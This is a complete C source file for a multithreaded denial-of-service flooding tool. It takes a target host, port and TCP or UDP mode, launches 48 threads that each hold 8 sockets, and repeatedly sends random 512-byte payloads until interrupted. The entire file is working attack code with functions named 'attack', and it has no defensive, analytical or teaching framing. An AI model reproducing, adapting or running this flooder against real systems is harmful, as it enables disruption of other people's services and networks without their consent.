#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define CONNECTIONS 8
#define THREADS 48
#define PAYLOAD_SIZE 512

volatile sig_atomic_t stop_attack = 0;

void handle_signal(int signal) {
    stop_attack = 1;
}

int create_socket(char *host, char *port, int protocol) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = protocol == SOCK_STREAM ? SOCK_STREAM : SOCK_DGRAM;
    
    if ((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
        return -1;
    }
    
    for (p = servinfo; p != NULL; p = p->ai_next) {
        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        int enable = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));
        
        if (protocol == SOCK_STREAM && connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }
    
    if (p == NULL) {
        fprintf(stderr, "Failed to connect to %s:%s\n", host, port);
        return -1;
    }
    
    freeaddrinfo(servinfo);
    return sock;
}

char *generate_payload(int size) {
    static char payload[PAYLOAD_SIZE];
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 94) + 33; // Random printable ASCII
    }
    payload[size - 1] = '\0';
    return payload;
}

void *attack(void *arg) {
    char **params = (char **)arg;
    char *host = params[0];
    char *port = params[1];
    int protocol = strcmp(params[2], "udp") == 0 ? SOCK_DGRAM : SOCK_STREAM;
    
    int sockets[CONNECTIONS] = {0};
    while (!stop_attack) {
        for (int x = 0; x < CONNECTIONS; x++) {
            if (sockets[x] <= 0) {
                sockets[x] = create_socket(host, port, protocol);
            }
            if (sockets[x] > 0) {
                int r = send(sockets[x], generate_payload(PAYLOAD_SIZE), PAYLOAD_SIZE, 0);
                if (r == -1) {
                    close(sockets[x]);
                    sockets[x] = 0;
                }
            }
        }
        usleep(300000);
    }
    for (int x = 0; x < CONNECTIONS; x++) {
        if (sockets[x] > 0) close(sockets[x]);
    }
    return NULL;
}

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target> <port> <tcp|udp>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    
    srand(time(NULL));
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    pthread_t threads[THREADS];
    for (int x = 0; x < THREADS; x++) {
        pthread_create(&threads[x], NULL, attack, argv);
    }
    
    for (int x = 0; x < THREADS; x++) {
        pthread_join(threads[x], NULL);
    }
    
    return 0;
}
